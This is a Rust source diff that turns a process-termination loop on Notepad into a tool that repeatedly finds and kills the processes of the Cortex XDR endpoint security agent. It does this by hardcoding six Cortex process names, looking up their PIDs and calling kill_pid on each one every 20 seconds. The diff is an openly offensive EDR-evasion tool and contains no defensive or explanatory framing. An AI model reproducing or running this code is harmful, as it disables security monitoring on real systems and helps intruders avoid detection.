@@ -22,6 +22,15 @@ fn NT_SUCCESS(Status: i32) -> bool {
     Status >= 0
 }
 
+static PROC_NAMES: [&str; 6] = [
+    "cortex-xdr-payload.exe",
+    "cysandbox.exe",
+    "cyserver.exe",
+    "cyuserver.exe",
+    "cywscsvc.exe",
+    "tlaworker.exe",
+];
+
 fn get_pid(proc_name: &str) -> u32 {
     let mut pid: u32 = 0;
     unsafe {
@@ -62,6 +71,15 @@ fn get_pid(proc_name: &str) -> u32 {
                 )
             {
                 pid = (*proc_info).UniqueProcessId as u32;
+
+                // if pid == 0 {
+                //     println!("[-] Process {} not found.", proc_name);
+                //     continue;
+                // }
+                if pid != 0 {
+                    println!("Process name: {}, PID: {}", proc_name, pid);
+                    kill_pid(pid);
+                }
                 break;
             }
 
@@ -133,18 +151,23 @@ fn kill_pid(pid: u32) -> bool {
 }
 
 fn main() {
-    let mut proc_names: Vec<String> = Vec::new();
-    proc_names.push("Notepad.exe".to_string());
+    // let mut proc_names: Vec<String> = Vec::new();
+    // proc_names.push("cortex-xdr-payload.exe".to_string());
+    // proc_names.push("cysandbox.exe".to_string());
+    // proc_names.push("cyserver.exe".to_string());
+    // proc_names.push("cyuserver.exe".to_string());
+    // proc_names.push("cywscsvc.exe".to_string());
+    // proc_names.push("tlaworker.exe".to_string());
 
     loop {
-        for proc_name in &proc_names {
+        for proc_name in PROC_NAMES.iter() {
             let pid = get_pid(proc_name);
-            if pid == 0 {
-                println!("[-] Process {} not found.", proc_name);
-                continue;
-            }
-            println!("Process name: {}, PID: {}", proc_name, pid);
-            kill_pid(pid);
+            // if pid == 0 {
+            //     println!("[-] Process {} not found.", proc_name);
+            //     continue;
+            // }
+            // println!("Process name: {}, PID: {}", proc_name, pid);
+            // kill_pid(pid);
         }
         std::thread::sleep(Duration::from_secs(20));
     }
